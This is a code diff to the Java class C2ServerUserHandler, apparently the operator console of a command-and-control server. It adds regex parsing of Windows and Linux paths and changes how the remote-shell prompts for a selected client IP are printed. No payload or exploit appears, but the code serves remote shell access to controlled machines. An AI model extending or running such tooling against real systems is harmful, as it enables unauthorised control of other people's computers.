@@ -6,6 +6,7 @@ import java.security.MessageDigest;
 import java.util.HashMap;
 import java.util.LinkedList;
 import java.util.Scanner;
+import java.util.regex.Pattern;
 import java.util.Queue;
 import java.util.HashSet;
 import java.util.Arrays;
@@ -238,7 +239,7 @@ public class C2ServerUserHandler implements Runnable{
      */
     private void enterClientShell(){
         System.out.println("Enter 'q' at any time to exit the shell and return to the main menu\n");
-        System.out.println("Enter IP address of Client >> ");
+        System.out.print("Enter IP address of Client >> ");
         String cilentIP = userInputScanner.nextLine().toLowerCase();
         if(cilentIP.equals("q")){
             currentUserPath = "";
@@ -269,13 +270,29 @@ public class C2ServerUserHandler implements Runnable{
             String currentMessage;
             boolean foundCorrectClient = false;
             String currentDirectory = "C:\\";
+
+            // Regex Patterns to search for filepaths (C:\ or /)
+            String windowsPathRegexPattern = "^[a-zA-Z]:\\\\(?:[^\\\\:*?\"<>|\\r\\n]+\\\\)*[^\\\\:*?\"<>|\\r\\n]*$";
+            Pattern windowsCompiledRegexPattern = Pattern.compile(windowsPathRegexPattern);
+
+            String linuxPathRegexPattern = "^(/[^/ ]*)+/?$";
+            Pattern linuxCompiledRegexPattern = Pattern.compile(linuxPathRegexPattern);
     
+            // Iterate through each message returned from the client to find the current directory
             synchronized(messageQueue){
                 while(!(messageQueue.isEmpty())){
                     currentMessage = messageQueue.remove();
                     if(foundCorrectClient){
-                        System.out.println(currentMessage);
-                        currentDirectory = currentMessage;
+                        if(windowsCompiledRegexPattern.matcher(currentMessage).matches()){
+                            System.out.println(currentMessage);
+                            currentDirectory = currentMessage;
+                            break;
+                        }
+                        else if(linuxCompiledRegexPattern.matcher(currentMessage).matches()){
+                            System.out.println(currentMessage);
+                            currentDirectory = currentMessage;
+                            break;
+                        }
                     } else if(currentMessage.contains(cilentIP)){
                         foundCorrectClient = true;
                     }
@@ -285,9 +302,9 @@ public class C2ServerUserHandler implements Runnable{
             String command;
             while(true){
                 if(currentDirectory.contains("C:")){
-                    System.out.println("PS " + currentDirectory + "> ");
+                    System.out.print("PS " + currentDirectory + "> ");
                 } else {
-                    System.out.println("root@" + cilentIP + ":" + currentDirectory + "# ");
+                    System.out.print("root@" + cilentIP + ":" + currentDirectory + "# ");
                 }
 
                 command = userInputScanner.nextLine();
